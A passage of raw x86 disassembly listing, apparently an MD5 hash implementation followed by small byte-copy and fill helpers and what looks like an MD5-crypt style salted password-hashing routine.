13146555:	0b d7                	or     %edi,%edx
13146557:	8b f8                	mov    %eax,%edi
13146559:	03 d1                	add    %ecx,%edx
1314655b:	33 f9                	xor    %ecx,%edi
1314655d:	33 fa                	xor    %edx,%edi
1314655f:	03 7d cc             	add    -0x34(%ebp),%edi
13146562:	8d 9c 3b 42 39 fa ff 	lea    -0x5c6be(%ebx,%edi,1),%ebx
13146569:	8b fb                	mov    %ebx,%edi
1314656b:	c1 ef 1c             	shr    $0x1c,%edi
1314656e:	c1 e3 04             	shl    $0x4,%ebx
13146571:	0b fb                	or     %ebx,%edi
13146573:	8b d9                	mov    %ecx,%ebx
13146575:	03 fa                	add    %edx,%edi
13146577:	33 da                	xor    %edx,%ebx
13146579:	33 df                	xor    %edi,%ebx
1314657b:	03 5d d8             	add    -0x28(%ebp),%ebx
1314657e:	8d 84 18 81 f6 71 87 	lea    -0x788e097f(%eax,%ebx,1),%eax
13146585:	8b d8                	mov    %eax,%ebx
13146587:	c1 eb 15             	shr    $0x15,%ebx
1314658a:	c1 e0 0b             	shl    $0xb,%eax
1314658d:	0b d8                	or     %eax,%ebx
1314658f:	03 df                	add    %edi,%ebx
13146591:	8b c3                	mov    %ebx,%eax
13146593:	33 c2                	xor    %edx,%eax
13146595:	33 c7                	xor    %edi,%eax
13146597:	03 45 e4             	add    -0x1c(%ebp),%eax
1314659a:	8d 8c 01 22 61 9d 6d 	lea    0x6d9d6122(%ecx,%eax,1),%ecx
131465a1:	8b c1                	mov    %ecx,%eax
131465a3:	c1 e8 10             	shr    $0x10,%eax
131465a6:	c1 e1 10             	shl    $0x10,%ecx
131465a9:	0b c1                	or     %ecx,%eax
131465ab:	03 c3                	add    %ebx,%eax
131465ad:	89 45 0c             	mov    %eax,0xc(%ebp)
131465b0:	8b cb                	mov    %ebx,%ecx
131465b2:	33 c8                	xor    %eax,%ecx
131465b4:	8b c1                	mov    %ecx,%eax
131465b6:	33 c7                	xor    %edi,%eax
131465b8:	03 45 f0             	add    -0x10(%ebp),%eax
131465bb:	8d 94 02 0c 38 e5 fd 	lea    -0x21ac7f4(%edx,%eax,1),%edx
131465c2:	8b c2                	mov    %edx,%eax
131465c4:	c1 e0 17             	shl    $0x17,%eax
131465c7:	c1 ea 09             	shr    $0x9,%edx
131465ca:	0b c2                	or     %edx,%eax
131465cc:	03 45 0c             	add    0xc(%ebp),%eax
131465cf:	33 c8                	xor    %eax,%ecx
131465d1:	03 4d bc             	add    -0x44(%ebp),%ecx
131465d4:	8d bc 0f 44 ea be a4 	lea    -0x5b4115bc(%edi,%ecx,1),%edi
131465db:	8b cf                	mov    %edi,%ecx
131465dd:	c1 e9 1c             	shr    $0x1c,%ecx
131465e0:	c1 e7 04             	shl    $0x4,%edi
131465e3:	0b cf                	or     %edi,%ecx
131465e5:	8b 7d 0c             	mov    0xc(%ebp),%edi
131465e8:	8b d7                	mov    %edi,%edx
131465ea:	03 c8                	add    %eax,%ecx
131465ec:	33 d0                	xor    %eax,%edx
131465ee:	33 d1                	xor    %ecx,%edx
131465f0:	03 55 c8             	add    -0x38(%ebp),%edx
131465f3:	8d 9c 13 a9 cf de 4b 	lea    0x4bdecfa9(%ebx,%edx,1),%ebx
131465fa:	8b d3                	mov    %ebx,%edx
131465fc:	c1 ea 15             	shr    $0x15,%edx
131465ff:	c1 e3 0b             	shl    $0xb,%ebx
13146602:	0b d3                	or     %ebx,%edx
13146604:	03 d1                	add    %ecx,%edx
13146606:	8b da                	mov    %edx,%ebx
13146608:	89 55 08             	mov    %edx,0x8(%ebp)
1314660b:	33 d8                	xor    %eax,%ebx
1314660d:	33 d9                	xor    %ecx,%ebx
1314660f:	03 5d d4             	add    -0x2c(%ebp),%ebx
13146612:	8d 9c 1f 60 4b bb f6 	lea    -0x944b4a0(%edi,%ebx,1),%ebx
13146619:	8b fb                	mov    %ebx,%edi
1314661b:	c1 ef 10             	shr    $0x10,%edi
1314661e:	c1 e3 10             	shl    $0x10,%ebx
13146621:	0b fb                	or     %ebx,%edi
13146623:	03 fa                	add    %edx,%edi
13146625:	31 7d 08             	xor    %edi,0x8(%ebp)
13146628:	8b 5d 08             	mov    0x8(%ebp),%ebx
1314662b:	33 d9                	xor    %ecx,%ebx
1314662d:	03 5d e0             	add    -0x20(%ebp),%ebx
13146630:	8d 9c 18 70 bc bf be 	lea    -0x41404390(%eax,%ebx,1),%ebx
13146637:	8b c3                	mov    %ebx,%eax
13146639:	c1 e0 17             	shl    $0x17,%eax
1314663c:	c1 eb 09             	shr    $0x9,%ebx
1314663f:	0b c3                	or     %ebx,%eax
13146641:	8b 5d 08             	mov    0x8(%ebp),%ebx
13146644:	03 c7                	add    %edi,%eax
13146646:	33 d8                	xor    %eax,%ebx
13146648:	03 5d ec             	add    -0x14(%ebp),%ebx
1314664b:	8d 9c 19 c6 7e 9b 28 	lea    0x289b7ec6(%ecx,%ebx,1),%ebx
13146652:	8b cb                	mov    %ebx,%ecx
13146654:	c1 e9 1c             	shr    $0x1c,%ecx
13146657:	c1 e3 04             	shl    $0x4,%ebx
1314665a:	0b cb                	or     %ebx,%ecx
1314665c:	8b df                	mov    %edi,%ebx
1314665e:	03 c8                	add    %eax,%ecx
13146660:	33 d8                	xor    %eax,%ebx
13146662:	33 d9                	xor    %ecx,%ebx
13146664:	03 5d b8             	add    -0x48(%ebp),%ebx
13146667:	8d 94 1a fa 27 a1 ea 	lea    -0x155ed806(%edx,%ebx,1),%edx
1314666e:	8b da                	mov    %edx,%ebx
13146670:	c1 eb 15             	shr    $0x15,%ebx
13146673:	c1 e2 0b             	shl    $0xb,%edx
13146676:	0b da                	or     %edx,%ebx
13146678:	03 d9                	add    %ecx,%ebx
1314667a:	8b d3                	mov    %ebx,%edx
1314667c:	89 5d 08             	mov    %ebx,0x8(%ebp)
1314667f:	33 d0                	xor    %eax,%edx
13146681:	33 d1                	xor    %ecx,%edx
13146683:	03 55 c4             	add    -0x3c(%ebp),%edx
13146686:	8d 94 17 85 30 ef d4 	lea    -0x2b10cf7b(%edi,%edx,1),%edx
1314668d:	8b fa                	mov    %edx,%edi
1314668f:	c1 ef 10             	shr    $0x10,%edi
13146692:	c1 e2 10             	shl    $0x10,%edx
13146695:	0b fa                	or     %edx,%edi
13146697:	03 fb                	add    %ebx,%edi
13146699:	31 7d 08             	xor    %edi,0x8(%ebp)
1314669c:	8b 55 08             	mov    0x8(%ebp),%edx
1314669f:	33 d1                	xor    %ecx,%edx
131466a1:	03 55 d0             	add    -0x30(%ebp),%edx
131466a4:	8d 94 10 05 1d 88 04 	lea    0x4881d05(%eax,%edx,1),%edx
131466ab:	8b c2                	mov    %edx,%eax
131466ad:	c1 e0 17             	shl    $0x17,%eax
131466b0:	c1 ea 09             	shr    $0x9,%edx
131466b3:	0b c2                	or     %edx,%eax
131466b5:	8b 55 08             	mov    0x8(%ebp),%edx
131466b8:	03 c7                	add    %edi,%eax
131466ba:	33 d0                	xor    %eax,%edx
131466bc:	03 55 dc             	add    -0x24(%ebp),%edx
131466bf:	8d 94 11 39 d0 d4 d9 	lea    -0x262b2fc7(%ecx,%edx,1),%edx
131466c6:	8b ca                	mov    %edx,%ecx
131466c8:	c1 e9 1c             	shr    $0x1c,%ecx
131466cb:	c1 e2 04             	shl    $0x4,%edx
131466ce:	0b ca                	or     %edx,%ecx
131466d0:	8b d7                	mov    %edi,%edx
131466d2:	03 c8                	add    %eax,%ecx
131466d4:	33 d0                	xor    %eax,%edx
131466d6:	33 d1                	xor    %ecx,%edx
131466d8:	03 55 e8             	add    -0x18(%ebp),%edx
131466db:	8d 9c 13 e5 99 db e6 	lea    -0x1924661b(%ebx,%edx,1),%ebx
131466e2:	8b d3                	mov    %ebx,%edx
131466e4:	c1 ea 15             	shr    $0x15,%edx
131466e7:	c1 e3 0b             	shl    $0xb,%ebx
131466ea:	0b d3                	or     %ebx,%edx
131466ec:	03 d1                	add    %ecx,%edx
131466ee:	8b da                	mov    %edx,%ebx
131466f0:	33 d8                	xor    %eax,%ebx
131466f2:	33 d9                	xor    %ecx,%ebx
131466f4:	03 5d f4             	add    -0xc(%ebp),%ebx
131466f7:	8d 9c 1f f8 7c a2 1f 	lea    0x1fa27cf8(%edi,%ebx,1),%ebx
131466fe:	8b fb                	mov    %ebx,%edi
13146700:	c1 ef 10             	shr    $0x10,%edi
13146703:	c1 e3 10             	shl    $0x10,%ebx
13146706:	0b fb                	or     %ebx,%edi
13146708:	8b da                	mov    %edx,%ebx
1314670a:	03 fa                	add    %edx,%edi
1314670c:	33 df                	xor    %edi,%ebx
1314670e:	33 d9                	xor    %ecx,%ebx
13146710:	03 5d c0             	add    -0x40(%ebp),%ebx
13146713:	8d 84 18 65 56 ac c4 	lea    -0x3b53a99b(%eax,%ebx,1),%eax
1314671a:	8b d8                	mov    %eax,%ebx
1314671c:	c1 e3 17             	shl    $0x17,%ebx
1314671f:	c1 e8 09             	shr    $0x9,%eax
13146722:	0b d8                	or     %eax,%ebx
13146724:	8b c2                	mov    %edx,%eax
13146726:	03 df                	add    %edi,%ebx
13146728:	f7 d0                	not    %eax
1314672a:	0b c3                	or     %ebx,%eax
1314672c:	33 c7                	xor    %edi,%eax
1314672e:	03 45 b8             	add    -0x48(%ebp),%eax
13146731:	8d 8c 01 44 22 29 f4 	lea    -0xbd6ddbc(%ecx,%eax,1),%ecx
13146738:	8b c1                	mov    %ecx,%eax
1314673a:	c1 e8 1a             	shr    $0x1a,%eax
1314673d:	c1 e1 06             	shl    $0x6,%ecx
13146740:	0b c1                	or     %ecx,%eax
13146742:	8b cf                	mov    %edi,%ecx
13146744:	03 c3                	add    %ebx,%eax
13146746:	f7 d1                	not    %ecx
13146748:	0b c8                	or     %eax,%ecx
1314674a:	33 cb                	xor    %ebx,%ecx
1314674c:	03 4d d4             	add    -0x2c(%ebp),%ecx
1314674f:	8d 94 0a 97 ff 2a 43 	lea    0x432aff97(%edx,%ecx,1),%edx
13146756:	8b ca                	mov    %edx,%ecx
13146758:	c1 e9 16             	shr    $0x16,%ecx
1314675b:	c1 e2 0a             	shl    $0xa,%edx
1314675e:	0b ca                	or     %edx,%ecx
13146760:	8b d3                	mov    %ebx,%edx
13146762:	03 c8                	add    %eax,%ecx
13146764:	f7 d2                	not    %edx
13146766:	0b d1                	or     %ecx,%edx
13146768:	33 d0                	xor    %eax,%edx
1314676a:	03 55 f0             	add    -0x10(%ebp),%edx
1314676d:	8d bc 17 a7 23 94 ab 	lea    -0x546bdc59(%edi,%edx,1),%edi
13146774:	8b d7                	mov    %edi,%edx
13146776:	c1 ea 11             	shr    $0x11,%edx
13146779:	c1 e7 0f             	shl    $0xf,%edi
1314677c:	0b d7                	or     %edi,%edx
1314677e:	8b f8                	mov    %eax,%edi
13146780:	03 d1                	add    %ecx,%edx
13146782:	f7 d7                	not    %edi
13146784:	0b fa                	or     %edx,%edi
13146786:	33 f9                	xor    %ecx,%edi
13146788:	03 7d cc             	add    -0x34(%ebp),%edi
1314678b:	8d 9c 3b 39 a0 93 fc 	lea    -0x36c5fc7(%ebx,%edi,1),%ebx
13146792:	8b fb                	mov    %ebx,%edi
13146794:	c1 eb 0b             	shr    $0xb,%ebx
13146797:	c1 e7 15             	shl    $0x15,%edi
1314679a:	0b fb                	or     %ebx,%edi
1314679c:	8b d9                	mov    %ecx,%ebx
1314679e:	f7 d3                	not    %ebx
131467a0:	03 fa                	add    %edx,%edi
131467a2:	0b df                	or     %edi,%ebx
131467a4:	33 da                	xor    %edx,%ebx
131467a6:	03 5d e8             	add    -0x18(%ebp),%ebx
131467a9:	8d 9c 18 c3 59 5b 65 	lea    0x655b59c3(%eax,%ebx,1),%ebx
131467b0:	8b c3                	mov    %ebx,%eax
131467b2:	c1 e3 06             	shl    $0x6,%ebx
131467b5:	c1 e8 1a             	shr    $0x1a,%eax
131467b8:	0b c3                	or     %ebx,%eax
131467ba:	8b da                	mov    %edx,%ebx
131467bc:	f7 d3                	not    %ebx
131467be:	03 c7                	add    %edi,%eax
131467c0:	0b d8                	or     %eax,%ebx
131467c2:	33 df                	xor    %edi,%ebx
131467c4:	03 5d c4             	add    -0x3c(%ebp),%ebx
131467c7:	8d 9c 19 92 cc 0c 8f 	lea    -0x70f3336e(%ecx,%ebx,1),%ebx
131467ce:	8b cb                	mov    %ebx,%ecx
131467d0:	c1 e3 0a             	shl    $0xa,%ebx
131467d3:	c1 e9 16             	shr    $0x16,%ecx
131467d6:	0b cb                	or     %ebx,%ecx
131467d8:	8b df                	mov    %edi,%ebx
131467da:	03 c8                	add    %eax,%ecx
131467dc:	f7 d3                	not    %ebx
131467de:	0b d9                	or     %ecx,%ebx
131467e0:	33 d8                	xor    %eax,%ebx
131467e2:	03 5d e0             	add    -0x20(%ebp),%ebx
131467e5:	8d 9c 1a 7d f4 ef ff 	lea    -0x100b83(%edx,%ebx,1),%ebx
131467ec:	8b d3                	mov    %ebx,%edx
131467ee:	c1 ea 11             	shr    $0x11,%edx
131467f1:	c1 e3 0f             	shl    $0xf,%ebx
131467f4:	0b d3                	or     %ebx,%edx
131467f6:	8b d8                	mov    %eax,%ebx
131467f8:	03 d1                	add    %ecx,%edx
131467fa:	f7 d3                	not    %ebx
131467fc:	0b da                	or     %edx,%ebx
131467fe:	33 d9                	xor    %ecx,%ebx
13146800:	03 5d bc             	add    -0x44(%ebp),%ebx
13146803:	8d 9c 1f d1 5d 84 85 	lea    -0x7a7ba22f(%edi,%ebx,1),%ebx
1314680a:	8b fb                	mov    %ebx,%edi
1314680c:	c1 e7 15             	shl    $0x15,%edi
1314680f:	c1 eb 0b             	shr    $0xb,%ebx
13146812:	0b fb                	or     %ebx,%edi
13146814:	8b d9                	mov    %ecx,%ebx
13146816:	03 fa                	add    %edx,%edi
13146818:	f7 d3                	not    %ebx
1314681a:	0b df                	or     %edi,%ebx
1314681c:	33 da                	xor    %edx,%ebx
1314681e:	03 5d d8             	add    -0x28(%ebp),%ebx
13146821:	8d 9c 18 4f 7e a8 6f 	lea    0x6fa87e4f(%eax,%ebx,1),%ebx
13146828:	8b c3                	mov    %ebx,%eax
1314682a:	c1 e8 1a             	shr    $0x1a,%eax
1314682d:	c1 e3 06             	shl    $0x6,%ebx
13146830:	0b c3                	or     %ebx,%eax
13146832:	8b da                	mov    %edx,%ebx
13146834:	03 c7                	add    %edi,%eax
13146836:	f7 d3                	not    %ebx
13146838:	0b d8                	or     %eax,%ebx
1314683a:	33 df                	xor    %edi,%ebx
1314683c:	03 5d f4             	add    -0xc(%ebp),%ebx
1314683f:	8d 9c 19 e0 e6 2c fe 	lea    -0x1d31920(%ecx,%ebx,1),%ebx
13146846:	8b cb                	mov    %ebx,%ecx
13146848:	c1 e9 16             	shr    $0x16,%ecx
1314684b:	c1 e3 0a             	shl    $0xa,%ebx
1314684e:	0b cb                	or     %ebx,%ecx
13146850:	8b df                	mov    %edi,%ebx
13146852:	03 c8                	add    %eax,%ecx
13146854:	f7 d3                	not    %ebx
13146856:	0b d9                	or     %ecx,%ebx
13146858:	33 d8                	xor    %eax,%ebx
1314685a:	6a 40                	push   $0x40
1314685c:	03 5d d0             	add    -0x30(%ebp),%ebx
1314685f:	6a 00                	push   $0x0
13146861:	8d 9c 1a 14 43 01 a3 	lea    -0x5cfebcec(%edx,%ebx,1),%ebx
13146868:	8b d3                	mov    %ebx,%edx
1314686a:	c1 ea 11             	shr    $0x11,%edx
1314686d:	c1 e3 0f             	shl    $0xf,%ebx
13146870:	0b d3                	or     %ebx,%edx
13146872:	8b d8                	mov    %eax,%ebx
13146874:	03 d1                	add    %ecx,%edx
13146876:	f7 d3                	not    %ebx
13146878:	0b da                	or     %edx,%ebx
1314687a:	33 d9                	xor    %ecx,%ebx
1314687c:	03 5d ec             	add    -0x14(%ebp),%ebx
1314687f:	8d 9c 1f a1 11 08 4e 	lea    0x4e0811a1(%edi,%ebx,1),%ebx
13146886:	8b fb                	mov    %ebx,%edi
13146888:	c1 e7 15             	shl    $0x15,%edi
1314688b:	c1 eb 0b             	shr    $0xb,%ebx
1314688e:	0b fb                	or     %ebx,%edi
13146890:	8b d9                	mov    %ecx,%ebx
13146892:	03 fa                	add    %edx,%edi
13146894:	f7 d3                	not    %ebx
13146896:	0b df                	or     %edi,%ebx
13146898:	33 da                	xor    %edx,%ebx
1314689a:	03 5d c8             	add    -0x38(%ebp),%ebx
1314689d:	8d 9c 18 82 7e 53 f7 	lea    -0x8ac817e(%eax,%ebx,1),%ebx
131468a4:	8b c3                	mov    %ebx,%eax
131468a6:	c1 e8 1a             	shr    $0x1a,%eax
131468a9:	c1 e3 06             	shl    $0x6,%ebx
131468ac:	0b c3                	or     %ebx,%eax
131468ae:	8b da                	mov    %edx,%ebx
131468b0:	03 c7                	add    %edi,%eax
131468b2:	f7 d3                	not    %ebx
131468b4:	0b d8                	or     %eax,%ebx
131468b6:	01 06                	add    %eax,(%esi)
131468b8:	33 df                	xor    %edi,%ebx
131468ba:	03 5d e4             	add    -0x1c(%ebp),%ebx
131468bd:	8d 8c 19 35 f2 3a bd 	lea    -0x42c50dcb(%ecx,%ebx,1),%ecx
131468c4:	8b d9                	mov    %ecx,%ebx
131468c6:	c1 eb 16             	shr    $0x16,%ebx
131468c9:	c1 e1 0a             	shl    $0xa,%ecx
131468cc:	0b d9                	or     %ecx,%ebx
131468ce:	8b cf                	mov    %edi,%ecx
131468d0:	03 d8                	add    %eax,%ebx
131468d2:	f7 d1                	not    %ecx
131468d4:	0b cb                	or     %ebx,%ecx
131468d6:	01 5e 0c             	add    %ebx,0xc(%esi)
131468d9:	33 c8                	xor    %eax,%ecx
131468db:	03 4d c0             	add    -0x40(%ebp),%ecx
131468de:	8d 94 0a bb d2 d7 2a 	lea    0x2ad7d2bb(%edx,%ecx,1),%edx
131468e5:	8b ca                	mov    %edx,%ecx
131468e7:	c1 e9 11             	shr    $0x11,%ecx
131468ea:	c1 e2 0f             	shl    $0xf,%edx
131468ed:	0b ca                	or     %edx,%ecx
131468ef:	8b d0                	mov    %eax,%edx
131468f1:	03 cb                	add    %ebx,%ecx
131468f3:	f7 d2                	not    %edx
131468f5:	0b d1                	or     %ecx,%edx
131468f7:	01 4e 08             	add    %ecx,0x8(%esi)
131468fa:	33 d3                	xor    %ebx,%edx
131468fc:	03 55 dc             	add    -0x24(%ebp),%edx
131468ff:	8d bc 17 91 d3 86 eb 	lea    -0x14792c6f(%edi,%edx,1),%edi
13146906:	8b c7                	mov    %edi,%eax
13146908:	c1 e0 15             	shl    $0x15,%eax
1314690b:	c1 ef 0b             	shr    $0xb,%edi
1314690e:	0b c7                	or     %edi,%eax
13146910:	03 c1                	add    %ecx,%eax
13146912:	01 46 04             	add    %eax,0x4(%esi)
13146915:	8d 45 b8             	lea    -0x48(%ebp),%eax
13146918:	50                   	push   %eax
13146919:	e8 b1 00 00 00       	call   0x131469cf
1314691e:	83 c4 18             	add    $0x18,%esp
13146921:	5f                   	pop    %edi
13146922:	5e                   	pop    %esi
13146923:	5b                   	pop    %ebx
13146924:	c9                   	leave  
13146925:	c3                   	ret    
13146926:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
1314692b:	76 3d                	jbe    0x1314696a
1314692d:	8b 54 24 04          	mov    0x4(%esp),%edx
13146931:	8b 4c 24 08          	mov    0x8(%esp),%ecx
13146935:	56                   	push   %esi
13146936:	83 ce ff             	or     $0xffffffff,%esi
13146939:	8d 42 01             	lea    0x1(%edx),%eax
1314693c:	2b f2                	sub    %edx,%esi
1314693e:	8a 11                	mov    (%ecx),%dl
13146940:	88 50 ff             	mov    %dl,-0x1(%eax)
13146943:	8b 11                	mov    (%ecx),%edx
13146945:	c1 ea 08             	shr    $0x8,%edx
13146948:	88 10                	mov    %dl,(%eax)
1314694a:	8b 11                	mov    (%ecx),%edx
1314694c:	c1 ea 10             	shr    $0x10,%edx
1314694f:	88 50 01             	mov    %dl,0x1(%eax)
13146952:	8b 11                	mov    (%ecx),%edx
13146954:	c1 ea 18             	shr    $0x18,%edx
13146957:	88 50 02             	mov    %dl,0x2(%eax)
1314695a:	83 c0 04             	add    $0x4,%eax
1314695d:	83 c1 04             	add    $0x4,%ecx
13146960:	8d 14 06             	lea    (%esi,%eax,1),%edx
13146963:	3b 54 24 10          	cmp    0x10(%esp),%edx
13146967:	72 d5                	jb     0x1314693e
13146969:	5e                   	pop    %esi
1314696a:	c3                   	ret    
1314696b:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
13146970:	76 3e                	jbe    0x131469b0
13146972:	8b 54 24 08          	mov    0x8(%esp),%edx
13146976:	8b 4c 24 04          	mov    0x4(%esp),%ecx
1314697a:	56                   	push   %esi
1314697b:	57                   	push   %edi
1314697c:	6a fe                	push   $0xfffffffe
1314697e:	8d 42 02             	lea    0x2(%edx),%eax
13146981:	5e                   	pop    %esi
13146982:	2b f2                	sub    %edx,%esi
13146984:	0f b6 78 ff          	movzbl -0x1(%eax),%edi
13146988:	33 d2                	xor    %edx,%edx
1314698a:	8a 70 01             	mov    0x1(%eax),%dh
1314698d:	8a 10                	mov    (%eax),%dl
1314698f:	83 c0 04             	add    $0x4,%eax
13146992:	c1 e2 08             	shl    $0x8,%edx
13146995:	0b d7                	or     %edi,%edx
13146997:	0f b6 78 fa          	movzbl -0x6(%eax),%edi
1314699b:	c1 e2 08             	shl    $0x8,%edx
1314699e:	0b d7                	or     %edi,%edx
131469a0:	89 11                	mov    %edx,(%ecx)
131469a2:	8d 14 06             	lea    (%esi,%eax,1),%edx
131469a5:	83 c1 04             	add    $0x4,%ecx
131469a8:	3b 54 24 14          	cmp    0x14(%esp),%edx
131469ac:	72 d6                	jb     0x13146984
131469ae:	5f                   	pop    %edi
131469af:	5e                   	pop    %esi
131469b0:	c3                   	ret    
131469b1:	56                   	push   %esi
131469b2:	8b 74 24 10          	mov    0x10(%esp),%esi
131469b6:	85 f6                	test   %esi,%esi
131469b8:	76 13                	jbe    0x131469cd
131469ba:	8b 4c 24 08          	mov    0x8(%esp),%ecx
131469be:	8b 44 24 0c          	mov    0xc(%esp),%eax
131469c2:	2b c1                	sub    %ecx,%eax
131469c4:	8a 14 08             	mov    (%eax,%ecx,1),%dl
131469c7:	88 11                	mov    %dl,(%ecx)
131469c9:	41                   	inc    %ecx
131469ca:	4e                   	dec    %esi
131469cb:	75 f7                	jne    0x131469c4
131469cd:	5e                   	pop    %esi
131469ce:	c3                   	ret    
131469cf:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
131469d3:	85 c9                	test   %ecx,%ecx
131469d5:	76 26                	jbe    0x131469fd
131469d7:	8a 44 24 08          	mov    0x8(%esp),%al
131469db:	53                   	push   %ebx
131469dc:	8a d8                	mov    %al,%bl
131469de:	8b d1                	mov    %ecx,%edx
131469e0:	8a fb                	mov    %bl,%bh
131469e2:	57                   	push   %edi
131469e3:	8b 7c 24 0c          	mov    0xc(%esp),%edi
131469e7:	8b c3                	mov    %ebx,%eax
131469e9:	c1 e0 10             	shl    $0x10,%eax
131469ec:	66 8b c3             	mov    %bx,%ax
131469ef:	c1 e9 02             	shr    $0x2,%ecx
131469f2:	f3 ab                	rep stos %eax,%es:(%edi)
131469f4:	8b ca                	mov    %edx,%ecx
131469f6:	83 e1 03             	and    $0x3,%ecx
131469f9:	f3 aa                	rep stos %al,%es:(%edi)
131469fb:	5f                   	pop    %edi
131469fc:	5b                   	pop    %ebx
131469fd:	c3                   	ret    
131469fe:	55                   	push   %ebp
131469ff:	8b ec                	mov    %esp,%ebp
13146a01:	81 ec c0 00 00 00    	sub    $0xc0,%esp
13146a07:	53                   	push   %ebx
13146a08:	56                   	push   %esi
13146a09:	57                   	push   %edi
13146a0a:	6a 78                	push   $0x78
13146a0c:	be d4 39 15 13       	mov    $0x131539d4,%esi
13146a11:	6a 00                	push   $0x0
13146a13:	56                   	push   %esi
13146a14:	e8 09 bc ff ff       	call   0x13142622
13146a19:	8b 45 0c             	mov    0xc(%ebp),%eax
13146a1c:	ff 35 e8 07 15 13    	pushl  0x131507e8
13146a22:	a3 4c 3a 15 13       	mov    %eax,0x13153a4c
13146a27:	e8 d1 bc ff ff       	call   0x131426fd
13146a2c:	50                   	push   %eax
13146a2d:	ff 35 e8 07 15 13    	pushl  0x131507e8
13146a33:	ff 35 4c 3a 15 13    	pushl  0x13153a4c
13146a39:	e8 53 bc ff ff       	call   0x13142691
13146a3e:	83 c4 1c             	add    $0x1c,%esp
13146a41:	85 c0                	test   %eax,%eax
13146a43:	75 1c                	jne    0x13146a61
13146a45:	ff 35 e8 07 15 13    	pushl  0x131507e8
13146a4b:	e8 ad bc ff ff       	call   0x131426fd
13146a50:	59                   	pop    %ecx
13146a51:	8b 0d 4c 3a 15 13    	mov    0x13153a4c,%ecx
13146a57:	03 c8                	add    %eax,%ecx
13146a59:	89 0d 4c 3a 15 13    	mov    %ecx,0x13153a4c
13146a5f:	eb 06                	jmp    0x13146a67
13146a61:	8b 0d 4c 3a 15 13    	mov    0x13153a4c,%ecx
13146a67:	8b c1                	mov    %ecx,%eax
13146a69:	a3 d0 39 15 13       	mov    %eax,0x131539d0
13146a6e:	8a 11                	mov    (%ecx),%dl
13146a70:	84 d2                	test   %dl,%dl
13146a72:	74 16                	je     0x13146a8a
13146a74:	80 fa 24             	cmp    $0x24,%dl
13146a77:	74 11                	je     0x13146a8a
13146a79:	8d 51 08             	lea    0x8(%ecx),%edx
13146a7c:	3b c2                	cmp    %edx,%eax
13146a7e:	73 0a                	jae    0x13146a8a
13146a80:	40                   	inc    %eax
13146a81:	a3 d0 39 15 13       	mov    %eax,0x131539d0
13146a86:	8a 10                	mov    (%eax),%dl
13146a88:	eb e6                	jmp    0x13146a70
13146a8a:	2b c1                	sub    %ecx,%eax
13146a8c:	89 45 0c             	mov    %eax,0xc(%ebp)
13146a8f:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
13146a95:	50                   	push   %eax
13146a96:	e8 ba f4 ff ff       	call   0x13145f55
13146a9b:	8b 7d 08             	mov    0x8(%ebp),%edi
13146a9e:	57                   	push   %edi
13146a9f:	e8 59 bc ff ff       	call   0x131426fd
13146aa4:	50                   	push   %eax
13146aa5:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
13146aab:	57                   	push   %edi
13146aac:	50                   	push   %eax
13146aad:	e8 cb f4 ff ff       	call   0x13145f7d
13146ab2:	ff 35 e8 07 15 13    	pushl  0x131507e8
13146ab8:	e8 40 bc ff ff       	call   0x131426fd
13146abd:	50                   	push   %eax
13146abe:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
13146ac4:	ff 35 e8 07 15 13    	pushl  0x131507e8
13146aca:	50                   	push   %eax
13146acb:	e8 ad f4 ff ff       	call   0x13145f7d
13146ad0:	ff 75 0c             	pushl  0xc(%ebp)
13146ad3:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
13146ad9:	ff 35 4c 3a 15 13    	pushl  0x13153a4c
13146adf:	50                   	push   %eax
13146ae0:	e8 98 f4 ff ff       	call   0x13145f7d
13146ae5:	8d 45 98             	lea    -0x68(%ebp),%eax
13146ae8:	50                   	push   %eax
13146ae9:	e8 67 f4 ff ff       	call   0x13145f55
13146aee:	57                   	push   %edi
13146aef:	e8 09 bc ff ff       	call   0x131426fd
13146af4:	50                   	push   %eax
13146af5:	8d 45 98             	lea    -0x68(%ebp),%eax
13146af8:	57                   	push   %edi
13146af9:	50                   	push   %eax
13146afa:	e8 7e f4 ff ff       	call   0x13145f7d
13146aff:	83 c4 44             	add    $0x44,%esp
13146b02:	8d 45 98             	lea    -0x68(%ebp),%eax
13146b05:	ff 75 0c             	pushl  0xc(%ebp)
13146b08:	ff 35 4c 3a 15 13    	pushl  0x13153a4c
13146b0e:	50                   	push   %eax
13146b0f:	e8 69 f4 ff ff       	call   0x13145f7d
13146b14:	57                   	push   %edi
13146b15:	e8 e3 bb ff ff       	call   0x131426fd
13146b1a:	50                   	push   %eax
13146b1b:	8d 45 98             	lea    -0x68(%ebp),%eax
13146b1e:	57                   	push   %edi
13146b1f:	50                   	push   %eax
13146b20:	e8 58 f4 ff ff       	call   0x13145f7d
13146b25:	8d 45 98             	lea    -0x68(%ebp),%eax
13146b28:	50                   	push   %eax
13146b29:	8d 45 f0             	lea    -0x10(%ebp),%eax
13146b2c:	50                   	push   %eax
13146b2d:	e8 e9 f4 ff ff       	call   0x1314601b
13146b32:	57                   	push   %edi
13146b33:	e8 c5 bb ff ff       	call   0x131426fd
13146b38:	83 c4 28             	add    $0x28,%esp
13146b3b:	8b d8                	mov    %eax,%ebx
13146b3d:	85 db                	test   %ebx,%ebx
13146b3f:	6a 10                	push   $0x10
13146b41:	7e 20                	jle    0x13146b63
13146b43:	58                   	pop    %eax
13146b44:	3b d8                	cmp    %eax,%ebx
13146b46:	7f 02                	jg     0x13146b4a
13146b48:	8b c3                	mov    %ebx,%eax
13146b4a:	50                   	push   %eax
13146b4b:	8d 45 f0             	lea    -0x10(%ebp),%eax
13146b4e:	50                   	push   %eax
13146b4f:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
13146b55:	50                   	push   %eax
13146b56:	e8 22 f4 ff ff       	call   0x13145f7d
13146b5b:	83 c4 0c             	add    $0xc,%esp
13146b5e:	83 eb 10             	sub    $0x10,%ebx
13146b61:	eb da                	jmp    0x13146b3d
13146b63:	8d 45 f0             	lea    -0x10(%ebp),%eax
13146b66:	6a 00                	push   $0x0
13146b68:	50                   	push   %eax
13146b69:	e8 b4 ba ff ff       	call   0x13142622
13146b6e:	57                   	push   %edi
13146b6f:	e8 89 bb ff ff       	call   0x131426fd
13146b74:	8b d8                	mov    %eax,%ebx
13146b76:	83 c4 10             	add    $0x10,%esp
